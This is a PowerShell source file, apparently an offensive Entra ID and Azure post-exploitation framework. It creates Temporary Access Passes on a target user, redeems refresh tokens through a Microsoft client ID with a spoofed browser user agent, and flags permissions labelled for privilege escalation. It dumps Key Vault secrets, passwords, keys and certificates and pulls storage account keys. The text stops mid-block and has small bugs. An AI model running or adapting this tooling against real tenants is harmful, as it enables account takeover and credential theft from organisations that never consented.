# -----------------------------
# Entra ID Interactive Framework
# Author: Shaked Weissman
# -----------------------------
function EntraCollection {


function Invoke-TAPChanger {
    param(
        [string]$UseTargetID,
        [string]$GraphAccessToken,
        [switch]$Add,
        [switch]$Delete,
        [int]$LifetimeMinutes = 60,
        [bool]$IsUsableOnce = $false,
        [datetime]$StartDateTime
    )


    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

        function New-TemporaryAccessPass {
            param(
                [string]$UserId,
                [string]$Token,
                [int]$Minutes,
                [bool]$UsableOnce,
                [datetime]$Start
            )

            $url = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
            $body = @{
                lifetimeInMinutes = $Minutes
                isUsableOnce      = $UsableOnce
            }

            if ($Start) {
                $body.startDateTime = $Start.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }

            $headers = @{
                Authorization = "Bearer $Token"
                "Content-Type" = "application/json"
                "User-Agent"    = "$UserAgent"
            }

            try {
                $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ($body | ConvertTo-Json -Depth 10)
                Write-Host "[+] TAP Created Successfully" -ForegroundColor Green
                Write-Host "    TemporaryAccessPass : $($response.temporaryAccessPass)"
                Write-Host "    StartDateTime       : $($response.startDateTime)"
            } catch {
                Write-Error "[-] Failed to create TAP: $_"
            }
        }


        function Remove-TemporaryAccessPass {
            param(
                [string]$UserId,
                [string]$Token
            )

            $baseUrl = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
            $headers = @{
                Authorization = "Bearer $Token"
                "Content-Type" = "application/json"
                "User-Agent"    = "$UserAgent"
            }   

            try {
                $methods = Invoke-RestMethod -Uri $baseUrl -Method Get -Headers $headers
                foreach ($method in $methods.value) {
                    $deleteUrl = "$baseUrl/$($method.id)"
                    Invoke-RestMethod -Uri $deleteUrl -Method Delete -Headers $headers
                    Write-Host "[+] TAP Deleted: $($method.id)" -ForegroundColor Yellow
                }
            } catch {
                Write-Error "[-] Failed to delete TAP(s): $_"
            }
        }

        if ($Add) {
            if ($PSBoundParameters.ContainsKey('StartDateTime')) {
			    New-TemporaryAccessPass -UserId $UseTargetID -Token $GraphAccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce -Start $StartDateTime
		    } else {
			    New-TemporaryAccessPass -UserId $UseTargetID -Token $GraphAccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce
		    }

        }

        if ($Delete) {
            Remove-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken
        }
}

<########################################################################################################>
function Invoke-ResourcePermissions {

    param(
        [string]$RefreshToken,
        [string]$ARMAccessToken,
        [string]$ClientId,
        [string]$ClientSecret,
	    [string]$TenantID,
		[switch]$clin,
		[switch]$ref,
        [switch]$KeyVault,
        [switch]$StorageAccount,
        [switch]$VirtualMachine,
        [switch]$All
    )

   	    $KeyVaultPermissions = @{
            "Microsoft.KeyVault/*"                          = "Wildcard"
            "Microsoft.KeyVault/vaults/*"                   = "Wildcard2"
            "Microsoft.KeyVault/vaults/read"                = "Vault Read"
            "Microsoft.KeyVault/vaults/write"               = "Vault Write"
            "Microsoft.KeyVault/vaults/secrets/read"        = "Secrets Read"
            "Microsoft.KeyVault/vaults/keys/read"           = "Keys Read"
            "Microsoft.KeyVault/vaults/certificates/read"   = "Certificates Read"
		}

        $VirtualMachinePermissions = @{
            "Microsoft.Compute/virtualMachines/runCommand/action"   = "Run arbitrary commands inside the VM"
            "Microsoft.Compute/virtualMachines/extensions/write"    = "Deploy or modify VM extensions"
            "Microsoft.Compute/virtualMachines/start/action"        = "Start stopped VM"
            "Microsoft.Compute/virtualMachines/restart/action"      = "Restart VM"
            "Microsoft.Compute/virtualMachines/deallocate/action"   = "Stop VM (without deletion)"
            "Microsoft.Compute/virtualMachines/delete"              = "Delete the VM"
            "Microsoft.Compute/virtualMachines/capture/action"      = "Capture VM image (potential cloning)"
            "Microsoft.Compute/virtualMachines/write"               = "Modify VM configuration"
            "Microsoft.Compute/virtualMachines/read"                = "Read VM information and properties"
            "Microsoft.Compute/virtualMachines/*"                   = "another2"
        }

        $StoragePermissions = @{
            "Microsoft.Storage/storageAccounts/listkeys/action"                     = "List storage account access keys"
            "Microsoft.Storage/storageAccounts/regeneratekey/action"                = "Regenerate access keys"
            "Microsoft.Storage/storageAccounts/blobServices/containers/read"        = "List blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/write"       = "Create or update blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/delete"      = "Delete blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"  = "Read blobs (file contents)"
            "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write" = "Upload or modify blobs"
            "Microsoft.Storage/storageAccounts/fileServices/shares/read"            = "List file shares"
            "Microsoft.Storage/storageAccounts/fileServices/shares/write"           = "Create or modify file shares"
            "Microsoft.Storage/storageAccounts/fileServices/shares/delete"          = "Delete file shares"
            "Microsoft.Storage/storageAccounts/read"                                = "Read storage account configuration"
            "Microsoft.Storage/storageAccounts/write"                               = "Update storage account settings"
            "Microsoft.Storage/storageAccounts/delete"                              = "Delete the entire storage account"
            "Microsoft.Storage/storageAccounts/*"                                   = "another1"
        }


        $ResourceAccessPermissions = @{
            "Microsoft.Authorization/roleAssignments/write"                  = "Assign roles to users or identities (Privilege Escalation)"
            "Microsoft.Authorization/roleDefinitions/write"                  = "Create custom roles with over-permissive access (Privilege Escalation)"
            "Microsoft.Authorization/elevateAccess/Action"                   = "Elevate access to full subscription scope (for tenant admins)"
            "Microsoft.Authorization/*/write"                                = "Wildcard write to all authorization settings (modify roles, policies, locks)"
            "Microsoft.Resources/subscriptions/write"                        = "Modify subscription settings (possible takeover or service disruption)"
            "Microsoft.Resources/deployments/write"                          = "Deploy ARM templates that can create privileged resources"
            "Microsoft.Support/*"                                            = "Open support tickets, potentially exposing tenant metadata or triggering automated workflows"
            "Microsoft.Resources/tags/write"                                 = "Modify tags and bypass tag-based conditional access or policies"
            "Microsoft.PolicyInsights/*"                                     = "Access or tamper with policy evaluation data (hide policy violations)"
            "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action" = "Assign Managed Identity to resources for privilege escalation"
            "Microsoft.ManagedIdentity/*"                                    = "Full control over managed identities (identity impersonation)"
            "Microsoft.Compute/virtualMachines/extensions/write"             = "Run arbitrary code on VMs via extension injection (e.g., CustomScript, AnyDesk)"
            "Microsoft.Compute/virtualMachines/runCommand/action"            = "Execute commands on VMs without needing RDP/SSH"
            "Microsoft.Compute/virtualMachines/write"                        = "Modify or create VMs that can include malicious configuration"
            "Microsoft.KeyVault/vaults/*"                                    = "Full access to Key Vaults, including secrets, keys, and certificates"
            "Microsoft.Web/sites/functions/write"                            = "Deploy serverless functions that execute code in the context of the app"
            "Microsoft.Web/sites/config/write"                               = "Modify app configuration (e.g., inject startup commands or environment variables)"
            "Microsoft.Automation/automationAccounts/jobs/write"             = "Execute code via automation jobs (can act as scheduled persistence)"
            "Microsoft.Logic/workflows/write"                                = "Create Logic Apps that exfiltrate data or trigger malicious flows"
            "Microsoft.Insights/alertRules/*"                                = "Trigger workflows and automation based on fabricated events"
            "Microsoft.Network/networkInterfaces/write"                      = "Modify NICs to redirect or sniff traffic"
            "Microsoft.Network/publicIPAddresses/write"                      = "Expose private resources to the internet by assigning public IPs"
            "Microsoft.Authorization/policyAssignments/write"                = "Modify or remove security policies"
        }




    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID,
            [string]$RefreshToken
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[-] Failed to get access token: $_" -ForegroundColor Red
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $ARMAccessToken) { return }

    if($clin){
		#Write-Host "client"
        $authMethod = "client"
    }
    
    if($ref){
		#Write-Host "refresh"
        $authMethod = "refresh"
    }
   
    $Headers = @{
        'Authorization' = "Bearer $ARMAccessToken"
        'User-Agent'    = "$UserAgent"
    }

    $SubUrl = "https://management.azure.com/subscriptions?api-version=2021-01-01"
    $Subscriptions = @()

	do {
		if ([Console]::KeyAvailable) {
			$key = [Console]::ReadKey($true)
			if ($key.Key -eq "Enter") {
				Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
				Write-Host "[1] Back To Menu"
				Write-Host "[2] Continue"
				$whatdoyou = Read-Host "Enter your choice"
				
				switch ($whatdoyou) {
					"1" {
						$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
						Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
						$Subscriptions = @()
						Show-MainMenu
						break
					}
					"2" {
						Write-Host "[+] Continue script..." -ForegroundColor Green
					}
					default {
						Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
					}
				}
			}
		}
		try {
			$response = Invoke-RestMethod -Uri $SubUrl -Headers $Headers
			$Subscriptions += $response.value
			$SubUrl = $response.nextLink
		} catch {
			Write-Warning "Failed to retrieve subscriptions: $($_.Exception.Message)"
			break
		}
	} while ($SubUrl)

	$Results = @()

        for ($x = 0; $x -lt $Subscriptions.Count; $x++) {
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq "Enter") {
					Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
					Write-Host "[1] Back To Menu"
					Write-Host "[2] Continue"
					$whatdoyou = Read-Host "Enter your choice"
					
					switch ($whatdoyou) {
						"1" {
							$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
							Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
							$Subscriptions = @()
							Show-MainMenu
							break
						}
						"2" {
							Write-Host "[+] Continue script..." -ForegroundColor Green
						}
						default {
							Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
						}
					}
				}
			}
            $subId = $Subscriptions[$x].subscriptionId
            Write-Host "   [*] Enumerating Permission on this subscription: $subId" -ForegroundColor Cyan

            $subscriptionPermissionUrl = "https://management.azure.com/subscriptions/$subId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            try {
                $subscriptionPermission = Invoke-RestMethod -Uri $subscriptionPermissionUrl -Headers $Headers
                $SubPermission_Actions = $subscriptionPermission.value.actions
                $SubPermission_NotActions = $subscriptionPermission.value.notActions
            } catch {
                Write-Warning "Failed to retrieve permissions for subscription $subId"
                continue
            }
			
			if ($subscriptionPermission.vaule -eq $null) {
				Write-Host "   You Dont Have Permission on this subscription " -ForegroundColor DarkRed
			}

            foreach ($ResourceAccess in $ResourceAccessPermissions.Keys) {
                if ($SubPermission_NotActions -contains "*" -or $SubPermission_NotActions -contains $ResourceAccess) {
                    Write-Host "     [!] your user have $ResourceAccess Not-Action Permissions on subscription $subId" -ForegroundColor DarkRed
                    Write-Host ""
                }
                elseif ($SubPermission_Actions -contains $ResourceAccess -or ($SubPermission_Actions -contains "*/write" -and -not ($SubPermission_NotActions -contains $ResourceAccess))) {
                    Write-Host "[*] Interesting permission of $ResourceAccess on subscription $subId" -ForegroundColor Yellow
                    Write-Host ""
                }
            }
        }


    foreach ($sub in $Subscriptions) {
        $subId = $sub.subscriptionId
        $subName = $sub.displayName
        Write-Host "`n[*] Checking subscription: $subName ($subId)" -ForegroundColor DarkCyan


		$Resources = @()
		$ResourcesUrl = "https://management.azure.com/subscriptions/$subId/resources?api-version=2021-04-01"
		try {
			do {
				$Response = Invoke-RestMethod -Uri $ResourcesUrl -Headers $Headers
				$Resources += $Response.value
				$ResourcesUrl = $Response.nextLink
				if ([Console]::KeyAvailable) {
					$key = [Console]::ReadKey($true)
					if ($key.Key -eq "Enter") {
						Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						Write-Host "[1] Back To Menu"
						Write-Host "[2] Continue"
						$whatdoyou = Read-Host "Enter your choice"
						
						switch ($whatdoyou) {
							"1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								$Resources = @()
								Show-MainMenu
								break
							}
							"2" {
								Write-Host "[+] Continue script..." -ForegroundColor Green
							}
							default {
								Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							}
						}
					}
				}
			} while ($ResourcesUrl)
		}
		catch {
			    Write-Warning "Failed to retrieve resources for subscription ${subName}: $($_.Exception.Message)"
				continue
		}

		if ($KeyVault -or $All) {
			$KeyVaults = $Resources | Where-Object { $_.type -eq "Microsoft.KeyVault/vaults" }
				foreach ($kv in $KeyVaults) {
					$kvId = $kv.id
					$kvName = $kv.name
					$kvRg = ($kvId -split '/')[4]
					Write-Host "   [+] Found KeyVault: $kvName in Resource Group: $kvRg" -ForegroundColor Yellow
					try {
						$Permission_Vault_Url = "https://management.azure.com${kvId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						$permResponse = Invoke-RestMethod -Uri $Permission_Vault_Url -Headers $Headers
						$Vault_Actions = $permResponse.value.actions
						$Vault_NotActions = $permResponse.value.notActions
					} catch {
							Write-Warning "Failed to retrieve permissions for KeyVault $kvName"
							continue
						}

					$PermissionFlags = @{
                        MicrosoftKeyVaultWildcard = $false
                        VaultWildcard = $false
                        VaultsRead = $false
                        VaultsWrite = $false
                        SecretsRead = $false
                        KeysRead = $false
                        CertificatesRead = $false
                        BadOption = $false
					}
						
					function Get-AccessToken {
						param(
							[string]$authMethod1,
							[string]$TenantID1
						)
						$Header = @{
							"User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
						}
						if($authMethod1 -eq "refresh") {
							$url = "https://login.microsoftonline.com/$TenantID1/oauth2/v2.0/token"
								$body = @{
									client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
									scope = "https://vault.azure.net/.default"
									grant_type = "refresh_token"
									refresh_token = $RefreshToken
								}
								$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $Header
								Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
								return $Tokens.access_token
							} elseif ($authMethod1 -eq "client") {
								$url = "https://login.microsoftonline.com/$TenantID1/oauth2/v2.0/token"
								$body = @{
									client_id = $ClientId
									client_secret = $ClientSecret
									scope = "https://vault.azure.net/.default"
									grant_type = "client_credentials"
								}
								$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $Header
									Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
									return $Tokens.access_token
							} else {
								Write-Error "Must provide either -RefreshToken or -ClientId and -ClientSecret."
								#exit
							}
                    }

					function Get-VaultItems {
						param (
							[string]$VaultUrl,
							[string]$VaultAccessToken,
							[ValidateSet('secrets', 'keys', 'certificates')]
							[string]$ItemType
						)

						$baseUri = "${VaultUrl}/${ItemType}?api-version=7.3"
						$headers = @{
								'Authorization' = "Bearer $VaultAccessToken"
								'User-Agent'    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
							}
							$AllItems = @()
							$NextUri = $baseUri

							do {
								try {
									$response = Invoke-WebRequest -Uri $NextUri -Headers $headers -UseBasicParsing
									$parsed = $response.Content | ConvertFrom-Json
									$AllItems += $parsed.value
									$NextUri = $parsed.nextLink
								} catch {
									Write-Host "       Failed to fetch $ItemType list from vault"
									break
								}
							} while ($NextUri)

							$DetailedItems = @()
							foreach ($item in $AllItems) {
								$itemUri = if ($ItemType -eq "keys") { $item.kid } else { $item.id }
								try {
									$itemDetailsResponse = Invoke-WebRequest -Uri "$($itemUri)?api-version=7.3" -Headers $headers -UseBasicParsing
									$itemDetails = $itemDetailsResponse.Content | ConvertFrom-Json
									if ($ItemType -eq "secrets") {
										$DetailedItems += [PSCustomObject]@{
											Name  = ($item.id -split '/')[-1]
											Value = $itemDetails.value
										}
									}
									elseif ($ItemType -eq "keys") {
										$DetailedItems += [PSCustomObject]@{
											Name  = ($item.kid -split '/')[-1]
											Value = $itemDetails.key.kid
										}
									}
									elseif ($ItemType -eq "certificates") {
										$DetailedItems += [PSCustomObject]@{
											Name  = ($item.id -split '/')[-1]
											Value = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($itemDetails.cer))
										}
									}
								} catch {
									if ($_.Exception.Response -ne $null) {
										$errorContent = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)
										if ($errorContent.error.code -eq "Forbidden" -or $errorContent.error.innererror.code -eq "ForbiddenByRbac") {
											Write-Host "		[-] Access Denied when fetching $ItemType from Vault" -ForegroundColor Red
											return @("Access Denied")
										}
									}
									Write-Host "       Failed to fetch $ItemType list from vault"
									return @()
								}

							}
								return $DetailedItems
					}
					
				foreach ($VaultPerm in $KeyVaultPermissions.Keys) {
					if ($Vault_NotActions -contains "*" -or $Vault_NotActions -contains $VaultPerm) {
						$PermissionFlags.BadOption = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/*" -or $Vault_Actions -contains "*/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.MicrosoftKeyVaultWildcard = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/*" -or ($Vault_Actions -contains "*" -and -not ($Vault_NotActions -contains $VaultPerm))) {
							$PermissionFlags.VaultWildcard = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.VaultsRead = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/write" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.VaultsWrite = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/secrets/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.SecretsRead = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/keys/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.KeysRead = $true
					}
					if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/certificates/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
						$PermissionFlags.CertificatesRead = $true
					}
				}
				
				if ([Console]::KeyAvailable) {
					 $key = [Console]::ReadKey($true)
					 if ($key.Key -eq "Enter") {
						 Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						 Write-Host "[1] Back To Menu"
						 Write-Host "[2] Continue"
						 $whatdoyou = Read-Host "Enter your choice"

						 switch ($whatdoyou) {
							 "1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								Show-MainMenu
								$PermissionFlags = @{
									MicrosoftKeyVaultWildcard = $false
									VaultWildcard = $false
									VaultsRead = $false
									VaultsWrite = $false
									SecretsRead = $false
									KeysRead = $false
									CertificatesRead = $false
									BadOption = $false
								}
								break
							 }
							 "2" {
								 Write-Host "[+] Continue script..." -ForegroundColor Green
							 }
							 default {
								 Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							 }
						 }
					 }
				 }
					
				if ($PermissionFlags.BadOption) {
					Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor Red
                    Write-Host ""
					continue
				}
   
				if ($PermissionFlags.SecretsRead -or $PermissionFlags.KeysRead -or $PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
                    Write-Host "     [STAR] Found Star Permission on this Vault Resource" -ForegroundColor DarkGreen
                    Write-Host ""
					$VaultAccessToken = Get-AccessToken -authMethod1 $authMethod -TenantID1 $TenantID
					$VaultUrl = "https://$kvName.vault.azure.net"

                    if ($PermissionFlags.SecretsRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
                            $VaultAccessToken = Get-AccessToken -authMethod1 $authMethod -TenantID1 $TenantID
                            $VaultUrl = "https://$kvName.vault.azure.net"
                            $SecretsList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "secrets")
                            $SecretPairs = @{}
                            $LonelySecrets = @()
                            foreach ($secret in $SecretsList) {
                                if ($secret.Name -match "^(.+?)-(username|password)$") {
                                    $base = $Matches[1]
                                    $type = $Matches[2]
                                    if (-not $SecretPairs.ContainsKey($base)) {
                                            $SecretPairs[$base] = @{
                                                Username = $null
                                                Password = $null
                                            }
                                        }
                                    $SecretPairs[$base][$type] = $secret.Value
                                } else {
                                    $LonelySecrets += $secret
                                    }
                            }
                            foreach ($baseName in $SecretPairs.Keys) {
                                $pair = $SecretPairs[$baseName]
                                    $Results += [PSCustomObject]@{
                                        SubscriptionName = $subName
                                        ResourceGroup    = $kvRg
                                        ResourceName     = $kvName
                                        ResourceType     = "KeyVault-Secret-Pair"
                                        SecretBaseName   = $baseName
                                        Username         = $pair.Username
                                        Password         = $pair.Password
                                    }
                            }
                            foreach ($secret in $LonelySecrets) {
                                $Results += [PSCustomObject]@{
                                    SubscriptionName = $subName
                                    ResourceGroup    = $kvRg
                                    ResourceName     = $kvName
                                    ResourceType     = "KeyVault-Secret"
                                    SecretBaseName   = $secret.Name
                                    SecretValue      = $secret.Value
                                }
                            }
                        }

					if ($PermissionFlags.KeysRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
						$KeysList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "keys")
						foreach ($key in $KeysList) {
							$Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Key"
								KeyName          = $key.Name
								KeyValue         = $key.Value
							}
						}
					}

					if ($PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
						$CertificatesList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "certificates")
						foreach ($cert in $CertificatesList) {
							$Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Certificate"
								CertificateName  = $cert.Name
								CertificateValue = $cert.Value
							}
						}
					}


                    if ($SecretsList.Count -gt 0 -or $KeysList.Count -gt 0 -or $CertificatesList.Count -gt 0) {
                            $Results += [PSCustomObject]@{
                                SubscriptionName = $subName
                                ResourceGroup    = $kvRg  
                                ResourceName     = $kvName
                                ResourceType     = "KeyVault" 
                                Secrets          = ($SecretsList -join "<br>") 
                                Keys             = ($KeysList -join "<br>")
                                Certificates     = ($CertificatesList -join "<br>")
                            }
                        }

                    } 
                
            
                    if ($PermissionFlags.BadOption) {
                            Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor DarkRed
                            Write-Host ""
                        }

                    if ($PermissionFlags.VaultsWrite) {
                            Write-Host "     [****] Found Write Permission on this Vault" -ForegroundColor DarkGreen
                            Write-Host ""
                    }
            }
        }
        
        if ($StorageAccount -or $All) {
			$StorageAccounts = $Resources | Where-Object { $_.type -eq "Microsoft.Storage/storageAccounts" }
			foreach ($sa in $StorageAccounts) {
				$saId = $sa.id
				$saName = $sa.name
				$saRg = ($saId -split '/')[4]
				Write-Host "   [+] Found StorageAccount: $saName in Resource Group: $saRg" -ForegroundColor Yellow

				try {
					$Permission_Storage_Url = "https://management.azure.com${saId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
					$permResponse = Invoke-RestMethod -Uri $Permission_Storage_Url -Headers $Headers
					$Storage_Actions = $permResponse.value.actions
					$Storage_NotActions = $permResponse.value.notActions
				} catch {
					continue
				}

				$FoundInteresting = $false
				$FoundConflict = $false
				$FoundBad = $false

				foreach ($StoragePerm in $StoragePermissions.Keys) {
					if ($Storage_Actions -contains $StoragePerm -and -not ($Storage_NotActions -contains $StoragePerm)) {
						$FoundInteresting = $true
					} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains $StoragePerm) {
						$FoundConflict = $true
					} elseif ($Storage_Actions -contains "*" -and -not ($Storage_NotActions -contains $StoragePerm)) {
						$FoundInteresting = $true
					} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains "*") {
						$FoundBad = $true
					}
				}
				
				if ([Console]::KeyAvailable) {
					 $key = [Console]::ReadKey($true)
					 if ($key.Key -eq "Enter") {
						 Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						 Write-Host "[1] Back To Menu"
						 Write-Host "[2] Continue"
						 $whatdoyou = Read-Host "Enter your choice"

						 switch ($whatdoyou) {
							 "1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								Show-MainMenu
								$FoundInteresting = $false
								$FoundConflict = $false
								$FoundBad = $false
								break
							 }
							 "2" {
								 Write-Host "[+] Continue script..." -ForegroundColor Green
							 }
							 default {
								 Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							 }
						 }
					 }
				 }
				if ($FoundConflict) {
					Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor DarkRed
					Write-Host ""
				}
				if ($FoundBad) {
					Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
					Write-Host ""
                }
				if ($FoundInteresting) {
					Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
                    Write-Host ""
					$Storageurl = "https://management.azure.com${saId}/listKeys?api-version=2024-01-01"
					$Headers = @{
						'Content-Type' = "application/json"
						'Authorization' = "Bearer $ARMAccessToken"
						'User-Agent' = "Mozilla/5.0"
					}

					try {
						$StorageResponse = Invoke-RestMethod -Uri $Storageurl -Headers $Headers -Method POST
						if ($StorageResponse.keys) {
							$keys = @($StorageResponse.keys)
							Write-Host "       [+] Key1: $($keys[0].value)" -ForegroundColor Yellow
							Write-Host "       [+] Key2: $($keys[1].value)" -ForegroundColor Yellow
							$Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $saRg
								ResourceName     = $saName
								ResourceType     = "StorageAccount"
								Key1             = $keys[0].value
								Key2             = $keys[1].value
							}
						} else {
							Write-Warning "No keys returned from the Storage account!"
						}
					} catch {
						#Write-Host "Failed to get Storage keys:" -ForegroundColor Red
						#Write-Host $_.Exception.Message -ForegroundColor Red
						continue
					}
					Write-Host ""
				}

				if (-not ($FoundInteresting -or $FoundConflict -or $FoundBad)) {
					# Write-Host "    [-] No special permissions found" -ForegroundColor Red
				}
			}
		}

        if ($VirtualMachine -or $All) {
            $VirtualMachines = $Resources | Where-Object { $_.type -eq "Microsoft.Compute/virtualMachines" }
            foreach ($vm in $VirtualMachines) {
                $vmId = $vm.id
                $vmName = $vm.name
				$vmRg   = ($vmId -split '/')[4]
                Write-Host "   [+] Found Virtual Machine: $vmName in Resource Group: $vmRg" -ForegroundColor Yellow

                try {
                    $Permission_VM_Url = "https://management.azure.com${vmId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						$permResponse = Invoke-RestMethod -Uri $Permission_VM_Url -Headers $Headers
						$VM_Actions = $permResponse.value.actions
						$VM_NotActions = $permResponse.value.notActions
                } catch {
						Write-Warning "Failed to retrieve permissions for VM $vmName"
						continue
                }
				$FoundGREAT = $false
				$FoundConflict = $false
				$FoundWOW = $false
				$FoundBAD = $false

                foreach ($VirtualPerm in $VirtualMachinePermissions.Keys) {
                    if ($VM_Actions -contains $VirtualPerm -and -not ($VM_NotActions -contains $VirtualPerm)){
					    $FoundGREAT = $true
                    } 
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains $VirtualPerm) {
						$FoundConflict = $true
                    } 
					elseif ($VM_Actions -contains '*' -and -not ($VM_NotActions -contains $VirtualPerm)){
						$FoundWOW = $true
					}
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains '*') {
						$FoundBAD = $true
                    } else {
 
                    }
				}
                
				if ([Console]::KeyAvailable) {
					 $key = [Console]::ReadKey($true)
					 if ($key.Key -eq "Enter") {
						 Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						 Write-Host "[1] Back To Menu"
						 Write-Host "[2] Continue"
						 $whatdoyou = Read-Host "Enter your choice"

						 switch ($whatdoyou) {
							 "1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
